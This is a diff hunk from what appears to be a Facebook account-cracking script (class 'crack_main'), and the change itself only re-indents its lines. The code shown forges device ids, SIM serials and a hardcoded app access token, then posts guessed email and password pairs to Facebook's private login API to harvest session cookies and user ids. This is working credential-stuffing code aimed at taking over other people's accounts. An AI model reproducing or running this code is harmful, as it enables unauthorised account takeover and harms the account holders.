@@ -411,19 +411,19 @@ class crack_main():
                         fak_tn="350685531728|62f8ce9f74b12f84c123cc23437a4a32","275254692598279|585aec5b4c27376758abb7ffcb9db2af"
                         random_seed = random.Random()
                         adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
-                                device_id = str(uuid.uuid4())
-                                secure = str(uuid.uuid4())
-                                family = str(uuid.uuid4())
-                                accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-                                xd =str(''.join(random_seed.choices(string.digits, k=20)))
-                                sim_serials = f'["{xd}"]'
-                                li = ['28','29','210']
-                                li2 = random.choice(li)
-                                j1 = ''.join(random.choice(digits) for _ in range(2))
-                                jazoest = li2+j1
-                                head = {'Connection': 'keep-alive', 'Authorization':f'OAuth {accessToken}', 'Host': 'https://b-api.facebook.com/method/auth.login', 'X-FB-Friendly-Name':'authenticate', 'X-FB-Connection-Type':'unknown', 'User-Agent':uas, 'Accept-Encoding':'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
-                                data = {'adid':adid,'format':'json','device_id':device_id,'email':ids,'password':pas,'generate_analytics_claims':'1','credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','meta_inf_fbmeta':'','currently_logged_in_userid':'0','fb_api_req_friendly_name':'authenticate',}
-                                po = requests.post('https://b-graph.facebook.com/auth/login',headers=head,data=data).json()
+                        device_id = str(uuid.uuid4())
+                        secure = str(uuid.uuid4())
+                        family = str(uuid.uuid4())
+                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
+                        sim_serials = f'["{xd}"]'
+                        li = ['28','29','210']
+                        li2 = random.choice(li)
+                        j1 = ''.join(random.choice(digits) for _ in range(2))
+                        jazoest = li2+j1
+                        head = {'Connection': 'keep-alive', 'Authorization':f'OAuth {accessToken}', 'Host': 'https://b-api.facebook.com/method/auth.login', 'X-FB-Friendly-Name':'authenticate', 'X-FB-Connection-Type':'unknown', 'User-Agent':uas, 'Accept-Encoding':'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
+                        data = {'adid':adid,'format':'json','device_id':device_id,'email':ids,'password':pas,'generate_analytics_claims':'1','credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','meta_inf_fbmeta':'','currently_logged_in_userid':'0','fb_api_req_friendly_name':'authenticate',}
+                        po = requests.post('https://b-graph.facebook.com/auth/login',headers=head,data=data).json()
                                 #print(po,hdata)ata)
                                 try:
                                         roid = str(po['uid'])
